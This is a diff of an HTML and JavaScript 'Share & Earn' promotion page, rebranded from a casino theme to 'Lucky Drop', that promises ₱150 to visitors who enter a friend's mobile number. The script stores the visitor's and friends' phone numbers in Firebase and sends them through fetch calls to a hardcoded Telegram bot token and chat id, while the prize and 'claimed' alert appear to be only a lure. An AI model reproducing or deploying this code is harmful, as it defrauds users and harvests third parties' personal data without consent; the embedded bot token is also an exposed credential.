@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Share & Earn | CasinoPlus</title>
+    <title>Lucky Drop | Share & Earn</title>
     
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -21,50 +21,57 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0a0f1e 0%, #0a2a1a 100%);
+            background: linear-gradient(135deg, #1a0a2a 0%, #2a1a3a 50%, #1a0a2a 100%);
             font-family: 'Public Sans', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Falling gold coins background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 20% 30%, rgba(255,215,0,0.08) 2px, transparent 2px);
+            background-size: 40px 40px;
+            pointer-events: none;
         }
         
         /* Main Container */
         .share-container {
-            max-width: 450px;
+            max-width: 480px;
             width: 100%;
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(15px);
-            border-radius: 48px;
-            padding: 25px 20px;
-            border: 1px solid rgba(255,215,0,0.3);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            background: linear-gradient(145deg, #2a1a3a, #1a0a2a);
+            border-radius: 60px;
+            padding: 25px 20px 35px;
+            border: 2px solid rgba(255,215,0,0.4);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5), inset 0 1px 2px rgba(255,255,255,0.1);
             position: relative;
             overflow: hidden;
         }
         
-        /* Glow effect */
-        .share-container::before {
+        /* Golden border glow */
+        .share-container::after {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,215,0,0.08) 0%, transparent 70%);
-            animation: rotate 20s linear infinite;
-        }
-        
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            inset: -2px;
+            background: linear-gradient(125deg, rgba(255,215,0,0), rgba(255,215,0,0.5), rgba(255,215,0,0));
+            border-radius: 60px;
+            pointer-events: none;
         }
         
         /* Header */
         .header {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             position: relative;
             z-index: 1;
         }
@@ -73,71 +80,128 @@
             font-family: 'Orbitron', monospace;
             font-size: 28px;
             font-weight: 900;
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            background: linear-gradient(135deg, #ffd700, #ff8c00, #ffd700);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: 2px;
+            text-shadow: 0 0 20px rgba(255,215,0,0.3);
         }
         
         .header p {
-            font-size: 12px;
+            font-size: 10px;
             color: #ffd966;
             margin-top: 5px;
+            letter-spacing: 1px;
         }
         
-        /* Prize Cards */
+        /* Prize Grid with Real Lucky Cats */
         .prize-grid {
             display: flex;
             gap: 15px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             position: relative;
             z-index: 1;
         }
         
         .prize-card {
             flex: 1;
-            background: linear-gradient(145deg, #1a2a1a, #0a1a0a);
-            border-radius: 28px;
-            padding: 20px 15px;
+            background: linear-gradient(145deg, #2a2035, #1a1525);
+            border-radius: 35px;
+            padding: 15px 12px;
             text-align: center;
             border: 1px solid rgba(255,215,0,0.3);
             transition: 0.3s;
+            position: relative;
+            overflow: hidden;
         }
         
         .prize-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            border-color: rgba(255,215,0,0.6);
+        }
+        
+        /* Real Lucky Cat Image */
+        .lucky-cat {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 8px;
+            position: relative;
+            animation: catBob 1.2s ease-in-out infinite;
+        }
+        
+        .lucky-cat-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.3));
+        }
+        
+        @keyframes catBob {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-5px) rotate(2deg); }
+        }
+        
+        /* Paw icon */
+        .paw-icon {
+            font-size: 20px;
+            display: inline-block;
+            animation: pawWave 0.6s ease-in-out infinite;
+            transform-origin: bottom center;
+        }
+        
+        @keyframes pawWave {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(8deg); }
         }
         
         .prize-label {
-            font-size: 12px;
+            font-size: 11px;
             color: #ffd966;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
+            letter-spacing: 1px;
+            margin: 8px 0 5px;
+        }
+        
+        .prize-label .paw-icon {
+            font-size: 12px;
+            margin-right: 4px;
         }
         
         .prize-amount {
             font-family: 'Orbitron', monospace;
-            font-size: 36px;
+            font-size: 28px;
             font-weight: 900;
             background: linear-gradient(135deg, #ffd700, #ffaa33);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
         
-        .prize-sub {
-            font-size: 10px;
-            color: #aaa;
-            margin-top: 5px;
+        /* Winners Banner - No "game credits" text */
+        .winners-banner {
+            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.12), transparent);
+            border-radius: 30px;
+            padding: 8px;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        
+        .winners-banner span {
+            font-size: 11px;
+            color: #ffd966;
+        }
+        
+        .winners-banner strong {
+            color: #ffd700;
+            font-size: 16px;
         }
         
         /* Timer Section */
         .timer-section {
             background: rgba(0,0,0,0.5);
             border-radius: 40px;
-            padding: 15px;
-            margin-bottom: 25px;
+            padding: 10px 12px;
+            margin-bottom: 20px;
             text-align: center;
             border: 1px solid rgba(255,215,0,0.2);
             position: relative;
@@ -145,54 +209,59 @@
         }
         
         .timer-label {
-            font-size: 11px;
+            font-size: 9px;
             color: #ffaa33;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 8px;
+            letter-spacing: 1px;
         }
         
         .timer-display {
             font-family: 'Orbitron', monospace;
-            font-size: 28px;
+            font-size: 20px;
             font-weight: 900;
             color: #ffd700;
-            letter-spacing: 3px;
+            letter-spacing: 1px;
         }
         
         /* Share Section */
         .share-section {
-            background: rgba(0,0,0,0.5);
-            border-radius: 32px;
-            padding: 20px;
-            margin-bottom: 20px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 30px;
+            padding: 18px;
+            margin-bottom: 15px;
             position: relative;
             z-index: 1;
+            border: 1px solid rgba(255,215,0,0.15);
         }
         
         .step-badge {
             display: inline-block;
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             color: #000;
-            padding: 4px 15px;
-            border-radius: 30px;
-            font-size: 11px;
+            padding: 4px 12px;
+            border-radius: 25px;
+            font-size: 10px;
             font-weight: 800;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
+        }
+        
+        .step-badge .paw-icon {
+            font-size: 11px;
+            margin-right: 4px;
         }
         
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
         
         .input-group input {
             width: 100%;
             background: rgba(0,0,0,0.6);
             border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 60px;
-            padding: 14px 20px;
+            border-radius: 50px;
+            padding: 12px 15px;
             color: #fff;
-            font-size: 16px;
+            font-size: 14px;
             text-align: center;
             outline: none;
             transition: 0.2s;
@@ -200,21 +269,26 @@
         
         .input-group input:focus {
             border-color: #ffd700;
-            box-shadow: 0 0 10px rgba(255,215,0,0.3);
+            box-shadow: 0 0 8px rgba(255,215,0,0.3);
         }
         
         .share-btn {
             width: 100%;
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             border: none;
-            padding: 14px;
-            border-radius: 60px;
-            font-size: 18px;
+            padding: 12px;
+            border-radius: 50px;
+            font-size: 16px;
             font-weight: 800;
             color: #000;
             cursor: pointer;
             transition: 0.2s;
             font-family: inherit;
+        }
+        
+        .share-btn .paw-icon {
+            font-size: 16px;
+            margin-right: 6px;
         }
         
         .share-btn:active {
@@ -227,31 +301,12 @@
             cursor: not-allowed;
         }
         
-        /* Locked/Unlocked Status */
-        .status-area {
-            text-align: center;
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 30px;
-            background: rgba(0,0,0,0.3);
-        }
-        
-        .locked {
-            color: #ff8888;
-            font-size: 12px;
-        }
-        
-        .unlocked {
-            color: #39ff14;
-            font-size: 12px;
-        }
-        
         .progress-bar {
             width: 100%;
-            height: 4px;
+            height: 3px;
             background: rgba(255,255,255,0.1);
             border-radius: 2px;
-            margin: 15px 0;
+            margin: 12px 0;
             overflow: hidden;
         }
         
@@ -262,14 +317,36 @@
             transition: width 0.3s ease;
         }
         
-        /* Prize Unlock Popup */
+        .status-area {
+            text-align: center;
+            margin-top: 8px;
+            padding: 6px;
+            border-radius: 25px;
+            background: rgba(0,0,0,0.3);
+        }
+        
+        .locked {
+            color: #ff8888;
+            font-size: 10px;
+        }
+        
+        .locked .paw-icon {
+            font-size: 11px;
+        }
+        
+        .unlocked {
+            color: #39ff14;
+            font-size: 10px;
+        }
+        
+        /* Prize Popup */
         .prize-popup {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.95);
+            background: rgba(0,0,0,0.96);
             backdrop-filter: blur(15px);
             z-index: 10000;
             display: none;
@@ -278,12 +355,12 @@
         }
         
         .prize-popup-card {
-            background: linear-gradient(145deg, #1a2a1a, #0a1a0a);
-            border-radius: 48px;
-            padding: 40px 30px;
+            background: linear-gradient(145deg, #2a1a3a, #1a0a2a);
+            border-radius: 40px;
+            padding: 30px 25px;
             text-align: center;
             border: 2px solid #ffd700;
-            max-width: 320px;
+            max-width: 280px;
             width: 85%;
             animation: bounceIn 0.4s ease;
         }
@@ -296,26 +373,26 @@
         
         .prize-popup-card h2 {
             color: #ffd700;
-            font-size: 28px;
-            margin-bottom: 15px;
+            font-size: 24px;
+            margin-bottom: 12px;
         }
         
         .prize-popup-card .popup-amount {
-            font-size: 48px;
+            font-size: 40px;
             font-weight: 900;
             color: #ffd700;
-            margin: 15px 0;
+            margin: 12px 0;
         }
         
         .prize-popup-card button {
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             border: none;
-            padding: 12px 25px;
-            border-radius: 40px;
-            font-size: 16px;
+            padding: 10px 20px;
+            border-radius: 35px;
+            font-size: 14px;
             font-weight: 800;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 12px;
         }
         
         /* Confetti Canvas */
@@ -335,40 +412,49 @@
 
 <div class="share-container">
     <div class="header">
-        <h1>🍀 SHARE & EARN 🍀</h1>
-        <p>Share with friend to unlock your prize!</p>
+        <h1>🐾 LUCKY DROP 🐾</h1>
+        <p>Share with friends to unlock your prize!</p>
     </div>
     
-    <!-- Prize Cards -->
+    <!-- Prize Grid with Real Lucky Cats -->
     <div class="prize-grid">
         <div class="prize-card">
-            <div class="prize-label">🎁 YOU GET</div>
-            <div class="prize-amount" id="yourPrize">₱18.30</div>
-            <div class="prize-sub">instantly credited</div>
+            <div class="lucky-cat">
+                <img src="https://i.imgur.com/7ZqZq0L.png" alt="Maneki-neko" class="lucky-cat-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Maneki-neko.jpg/200px-Maneki-neko.jpg'">
+            </div>
+            <div class="prize-label"><span class="paw-icon">🐾</span> YOU GET</div>
+            <div class="prize-amount" id="yourPrize">₱150</div>
         </div>
         <div class="prize-card">
-            <div class="prize-label">👥 FRIEND GETS</div>
-            <div class="prize-amount" id="friendPrize">₱18.30</div>
-            <div class="prize-sub">upon registration</div>
+            <div class="lucky-cat">
+                <img src="https://i.imgur.com/7ZqZq0L.png" alt="Maneki-neko" class="lucky-cat-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Maneki-neko.jpg/200px-Maneki-neko.jpg'">
+            </div>
+            <div class="prize-label"><span class="paw-icon">🐾</span> FRIEND GETS</div>
+            <div class="prize-amount" id="friendPrize">₱150</div>
         </div>
+    </div>
+    
+    <!-- Winners Banner -->
+    <div class="winners-banner">
+        <span>🌟 <strong>LUCKY WINNERS</strong> will receive <strong>150</strong> 🌟</span>
     </div>
     
     <!-- Timer -->
     <div class="timer-section">
-        <div class="timer-label">⏰ TIME LEFT TO CLAIM ⏰</div>
-        <div class="timer-display" id="timerDisplay">1D 22:07:29</div>
+        <div class="timer-label">⏰ HOORAY DROP ENDS IN ⏰</div>
+        <div class="timer-display" id="timerDisplay">2D 00:00:00</div>
     </div>
     
     <!-- Share Section -->
     <div class="share-section">
-        <div class="step-badge">📱 STEP 1 - SHARE WITH FRIEND</div>
+        <div class="step-badge"><span class="paw-icon">🐾</span> STEP 1 - SHARE WITH FRIEND <span class="paw-icon">🐾</span></div>
         
         <div class="input-group">
-            <input type="tel" id="friendPhone" placeholder="Mobile Number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            <input type="tel" id="friendPhone" placeholder="Enter friend's mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
         </div>
         
         <button class="share-btn" id="shareBtn" onclick="shareAndEarn()">
-            🎁 SHARE BONUS 🎁
+            <span class="paw-icon">🐾</span> SHARE & UNLOCK <span class="paw-icon">🐾</span>
         </button>
         
         <div class="progress-bar">
@@ -376,7 +462,7 @@
         </div>
         
         <div class="status-area" id="statusArea">
-            <span class="locked">🔒 Share with a friend to unlock your prize!</span>
+            <span class="locked"><span class="paw-icon">🐾</span> Share with a friend to unlock 150 credits! <span class="paw-icon">🐾</span></span>
         </div>
     </div>
 </div>
@@ -384,10 +470,13 @@
 <!-- Prize Unlock Popup -->
 <div id="prizePopup" class="prize-popup">
     <div class="prize-popup-card">
-        <h2>🎉 CONGRATULATIONS! 🎉</h2>
-        <p>You have unlocked your prize!</p>
-        <div class="popup-amount" id="popupAmount">₱18.30</div>
-        <button onclick="closePrizePopup()">CLAIM NOW</button>
+        <div class="lucky-cat" style="width: 80px; height: 80px; margin: 0 auto;">
+            <img src="https://i.imgur.com/7ZqZq0L.png" alt="Maneki-neko" style="width: 100%; height: 100%; object-fit: contain;">
+        </div>
+        <h2>🎉 LUCKY YOU! 🎉</h2>
+        <p>You have unlocked the prize!</p>
+        <div class="popup-amount" id="popupAmount">₱150</div>
+        <button onclick="closePrizePopup()">CLAIM REWARD</button>
     </div>
 </div>
 
@@ -402,6 +491,10 @@
     let timerInterval = null;
     let targetTime = null;
     
+    // Required shares to unlock (1 share unlocks immediately)
+    const REQUIRED_SHARES = 1;
+    const PRIZE_AMOUNT = 150;
+    
     // Initialize Firebase
     if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined') {
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
@@ -412,8 +505,8 @@
     userPhone = localStorage.getItem("userPhone");
     
     // Prize amounts
-    const YOUR_PRIZE = 18.30;
-    const FRIEND_PRIZE = 18.30;
+    const YOUR_PRIZE = PRIZE_AMOUNT;
+    const FRIEND_PRIZE = PRIZE_AMOUNT;
     
     // Load saved data
     async function loadShareData() {
@@ -437,7 +530,6 @@
         if (targetTime) {
             startTimer(targetTime);
         } else {
-            // Set default 48 hours timer
             targetTime = Date.now() + (48 * 60 * 60 * 1000);
             startTimer(targetTime);
             saveTargetTime();
@@ -462,15 +554,14 @@
     }
     
     function updateUIProgress() {
-        const progress = Math.min(shareCount / 3, 1) * 100;
+        const progress = Math.min(shareCount / REQUIRED_SHARES, 1) * 100;
         document.getElementById('progressFill').style.width = progress + '%';
         
-        if (shareCount >= 3 && !prizeUnlocked) {
+        if (shareCount >= REQUIRED_SHARES && !prizeUnlocked) {
             unlockPrize();
-        } else if (shareCount < 3) {
-            const remaining = 3 - shareCount;
+        } else if (shareCount < REQUIRED_SHARES) {
             document.getElementById('statusArea').innerHTML = `
-                <span class="locked">🔒 Share with ${remaining} more friend${remaining > 1 ? 's' : ''} to unlock!</span>
+                <span class="locked"><span class="paw-icon">🐾</span> Share with a friend to unlock 150 credits! <span class="paw-icon">🐾</span></span>
             `;
         }
     }
@@ -478,7 +569,7 @@
     function updateUILocked(isUnlocked) {
         if (isUnlocked) {
             document.getElementById('statusArea').innerHTML = `
-                <span class="unlocked">🎉 PRIZE UNLOCKED! Click CLAIM NOW to redeem! 🎉</span>
+                <span class="unlocked">🎉 PRIZE UNLOCKED! Click CLAIM to redeem 150 credits! 🎉</span>
             `;
             document.getElementById('shareBtn').disabled = true;
             document.getElementById('shareBtn').style.opacity = '0.5';
@@ -489,31 +580,28 @@
         prizeUnlocked = true;
         updateUILocked(true);
         saveShareData();
-        // Show prize popup automatically
         showPrizePopup();
     }
     
     function showPrizePopup() {
         const popup = document.getElementById('prizePopup');
-        document.getElementById('popupAmount').innerHTML = `₱${YOUR_PRIZE.toFixed(2)}`;
+        document.getElementById('popupAmount').innerHTML = `₱${YOUR_PRIZE}`;
         popup.style.display = 'flex';
         startConfetti();
         
-        // Send to Telegram
-        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("🎁 SHARE & EARN UNLOCKED!\n📱 " + userPhone + "\n💰 ₱" + YOUR_PRIZE)}`)
+        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("🐾 SHARE & EARN UNLOCKED!\n📱 " + userPhone + "\n💰 150 CREDITS")}`)
             .catch(e => console.log('Telegram error:', e));
     }
     
     function closePrizePopup() {
         document.getElementById('prizePopup').style.display = 'none';
         stopConfetti();
-        // Redirect or update main balance
-        alert("Prize claimed! ₱" + YOUR_PRIZE + " will be added to your balance.");
+        alert("🎉 150 Credits claimed! Check your balance.");
     }
     
     async function shareAndEarn() {
         if (prizeUnlocked) {
-            alert("Prize already unlocked! Click CLAIM NOW to redeem.");
+            alert("Prize already unlocked! Click CLAIM to redeem.");
             return;
         }
         
@@ -524,7 +612,6 @@
             return;
         }
         
-        // Check if already shared to this friend
         const shareRef = db.ref('share_earn/' + userPhone + '/sharedWith/' + friendPhone);
         const shareSnap = await shareRef.once('value');
         
@@ -533,7 +620,6 @@
             return;
         }
         
-        // Save share record
         await shareRef.set({
             timestamp: Date.now(),
             sharedBy: userPhone
@@ -543,22 +629,19 @@
         updateUIProgress();
         saveShareData();
         
-        // Send Telegram notification
-        const msg = `📱 SHARE & EARN\n📱 ${userPhone}\n👥 Shared with: ${friendPhone}\n📊 Progress: ${shareCount}/3`;
+        const msg = `🐾 SHARE & EARN\n📱 ${userPhone}\n👥 Shared with: ${friendPhone}\n📊 Progress: ${shareCount}/${REQUIRED_SHARES}`;
         fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`)
             .catch(e => console.log('Telegram error:', e));
         
-        // Clear input
         document.getElementById('friendPhone').value = '';
         
-        alert(`✅ Shared with ${friendPhone}!\nProgress: ${shareCount}/3 shares completed.`);
+        alert(`✅ Shared with ${friendPhone}!\nProgress: ${shareCount}/${REQUIRED_SHARES} share completed.`);
         
-        if (shareCount >= 3) {
+        if (shareCount >= REQUIRED_SHARES) {
             unlockPrize();
         }
     }
     
-    // Timer functions
     function startTimer(endTime) {
         if (timerInterval) clearInterval(timerInterval);
         
@@ -589,12 +672,10 @@
     }
     
     function timerExpired() {
-        alert("⏰ Time's up! The promotion has ended.");
+        alert("⏰ Time's up! The HOORAY DROP has ended.");
         document.getElementById('shareBtn').disabled = true;
     }
     
-    // Confetti effects
-    let confettiActive = false;
     let confettiAnimation = null;
     
     function startConfetti() {
@@ -624,7 +705,6 @@
             for (let p of particles) {
                 p.y += p.speed;
                 p.spin += 5;
-                
                 if (p.y < canvas.height) {
                     stillActive = true;
                     ctx.save();
@@ -665,9 +745,8 @@
     // Initialize
     loadShareData();
     
-    // Set initial prize displays
-    document.getElementById('yourPrize').innerHTML = `₱${YOUR_PRIZE.toFixed(2)}`;
-    document.getElementById('friendPrize').innerHTML = `₱${FRIEND_PRIZE.toFixed(2)}`;
+    document.getElementById('yourPrize').innerHTML = `₱${YOUR_PRIZE}`;
+    document.getElementById('friendPrize').innerHTML = `₱${FRIEND_PRIZE}`;
 </script>
 </body>
 </html>
